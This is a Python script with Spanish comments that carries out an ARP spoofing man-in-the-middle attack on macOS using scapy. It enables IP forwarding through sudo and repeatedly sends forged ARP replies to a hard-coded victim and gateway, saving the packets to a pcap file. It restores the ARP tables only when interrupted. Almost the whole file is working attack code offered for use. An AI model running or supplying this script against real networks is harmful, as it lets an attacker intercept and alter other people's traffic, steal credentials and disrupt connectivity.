from scapy.all import Ether, ARP, srp, send, wrpcap
import time
import subprocess
import sys

class ARPSpoofer:
    """
    Clase para realizar ARP Spoofing en macOS.

    Atributos:
        target_ip (str): IP del objetivo del ataque.
        host_ip (str): IP del host que se hará pasar por el atacante.
        verbose (bool): Determina si se mostrarán mensajes de estado.
    """

    def __init__(self, target_ip, host_ip, verbose=True):
        """
        Inicializa el ARPSpoofer con las IPs objetivo y del host.

        Args:
            target_ip (str): IP del objetivo del ataque.
            host_ip (str): IP del host que se hará pasar por el atacante.
            verbose (bool): Determina si se mostrarán mensajes de estado. Por defecto es True.
        """
        self.target_ip = target_ip
        self.host_ip = host_ip
        self.verbose = verbose

    def habilitar_enrutamiento_ip(self):
        """
        Habilita el forwarding de paquetes IP en macOS.
        """
        if self.verbose:
            print("Habilitando el forwarding de paquetes IP...")

        try:
            # Comando para habilitar el forwarding de paquetes IP en macOS
            subprocess.run(["sudo", "sysctl", "net.inet.ip.forwarding=1"], check=True)
            if self.verbose:
                print("Forwarding de paquetes IP activado.")
        except subprocess.CalledProcessError as e:
            print(f"Error al habilitar el forwarding de paquetes IP: {e}")
            sys.exit(1)

    @staticmethod
    def obtener_mac(ip):
        """
        Obtiene la dirección MAC correspondiente a una IP dada.

        Args:
            ip (str): Dirección IP.

        Returns:
            str: Dirección MAC correspondiente a la IP.
        """
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=0)
            if ans:
                return ans[0][1].src
        except Exception as e:
            print(f"Error al obtener la MAC de {ip}: {e}")

    def spoofear(self, ip_objetivo, ip_anfitrion):
        """
        Envía paquetes ARP para engañar a la red haciéndose pasar por otro host.

        Args:
            ip_objetivo (str): IP del dispositivo objetivo del ataque.
            ip_anfitrion (str): IP del host que se hará pasar por el atacante.
        """
        try:
            mac_objetivo = self.obtener_mac(ip_objetivo)
            respuesta_arp = ARP(
                pdst=ip_objetivo,
                hwdst=mac_objetivo,
                psrc=ip_anfitrion,
                op='is-at'
            )
            send(respuesta_arp, verbose=0)

            # Guardar el paquete en un archivo pcap
            wrpcap('arp_spoofing.pcap', respuesta_arp, append=True)

            if self.verbose:
                mac_propia = ARP().hwsrc
                print(f"Paquete ARP enviado a {ip_objetivo}: {ip_anfitrion} está en {mac_propia}")

        except Exception as e:
            print(f"Error al spoofear {ip_objetivo}: {e}")

    def restaurar(self, ip_objetivo, ip_anfitrion):
        """
        Envía paquetes ARP para restaurar la tabla ARP del dispositivo objetivo.

        Args:
            ip_objetivo (str): IP del dispositivo objetivo.
            ip_anfitrion (str): IP del host verdadero.
        """
        try:
            mac_objetivo = self.obtener_mac(ip_objetivo)
            mac_anfitrion = self.obtener_mac(ip_anfitrion)
            respuesta_arp = ARP(
                pdst=ip_objetivo,
                hwdst=mac_objetivo,
                psrc=ip_anfitrion,
                hwsrc=mac_anfitrion,
                op='is-at'
            )
            send(respuesta_arp, verbose=0, count=20)

            # Guardar el paquete en un archivo pcap
            wrpcap('arp_spoofing.pcap', respuesta_arp, append=True)

            if self.verbose:
                print(f"Restaurado {ip_objetivo}: {ip_anfitrion} está en {mac_anfitrion}")

        except Exception as e:
            print(f"Error al restaurar {ip_objetivo}: {e}")


def main():
    """
    Función principal para ejecutar el ataque ARP Spoofing en macOS.

    Este script realizará un ataque de ARP spoofing hasta que se interrumpa
    con una señal de teclado (Ctrl+C). Una vez interrumpido, restaurará la
    tabla ARP de los dispositivos afectados.
    """
    global spoofer, victima, gateway
    try:
        victima = "192.168.138.137"
        gateway = "192.168.1.37"
        print(f"Atacando {victima} contra {gateway}...")
        spoofer = ARPSpoofer(victima, gateway)
        spoofer.habilitar_enrutamiento_ip()

        while True:
            spoofer.spoofear(victima, gateway)
            spoofer.spoofear(gateway, victima)
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nDeteniendo ARP Spoofing. Restaurando la red...")
        spoofer.restaurar(victima, gateway)
        spoofer.restaurar(gateway, victima)
        sys.exit(0)


if __name__ == "__main__":
    main()
